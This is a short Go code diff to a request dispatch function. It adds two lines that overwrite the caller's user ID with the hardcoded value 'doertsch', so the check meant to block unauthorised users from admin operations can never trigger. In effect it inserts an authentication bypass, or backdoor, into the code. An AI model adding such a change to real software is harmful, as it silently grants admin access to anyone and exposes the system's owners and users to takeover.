@@ -29,6 +29,8 @@ func dispatch(
 	}
 
 	userId := lib.GetUserId(request)
+	doertsch := "doertsch"
+	userId = &doertsch
 
 	if userId == nil {
 		log.Println("Can not access admin operations as unauthorised user")
